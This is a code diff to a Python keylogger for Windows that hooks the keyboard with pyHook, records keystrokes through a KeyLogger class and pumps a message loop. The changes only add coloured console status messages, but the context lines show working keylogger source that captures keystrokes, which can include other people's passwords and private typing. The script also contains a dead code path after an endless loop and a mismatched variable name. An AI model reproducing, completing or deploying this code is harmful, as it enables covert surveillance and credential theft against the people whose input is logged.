@@ -11,6 +11,30 @@ import sys
 import time
 import win32clipboard
 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    BLACK = '\033[30m'
+    RED = '\033[31m'
+    GREEN = '\033[32m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    MAGENTA = '\033[35m'
+    BACKGROUND_MAGENTA = '\033[105m'
+    BACKGROUND_WHITE = '\033[47m'
+    CYAN = '\033[36m'
+    WHITE = '\033[37m'
+    ORANGE = '\033[38;5;208m'
+
+os.system("color")
+
 #===========================#
 
 class KeyLogger:
@@ -45,7 +69,7 @@ class KeyLogger:
             windll.kernel32.CloseHandle(hProcess)
             
         else:
-            print(f'Failed to get handle for process with PID: {processID}')
+            print(f"[{bcolors.FAIL}X{bcolors.ENDC}] Failed to get handle for process with PID: " + str(processID))
     
     def keystroke(self, event):
     
@@ -78,17 +102,27 @@ def run():
 
     try:
 
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Creating output log...")
         saveStdout = sys.stdout
         sys.stdout = StringIO()
         
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Creating logger object...")
         kl = KeyLogger()
+        
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Creating keyboard hook...")
         hm = pyHook.HookManager()
+        
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Setting up keystroke event listener...")
         hm.KeyDown = kl.keystroke
+        
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Hooking into keyboard...")
         hm.HookKeyboard()
         
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Starting event loop...")
         while True:
             pythoncom.PumpWaitingMessages()
             
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Saving log...")
         log = sys.stdout.getvalue()
         sys.stdout = save_stdout
         
@@ -97,5 +131,9 @@ def run():
     except Exception as e:
         print(str(e))
 
+#===========================#
+
 if __name__ == '__main__':
+
+    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Starting program...")
     print(run())
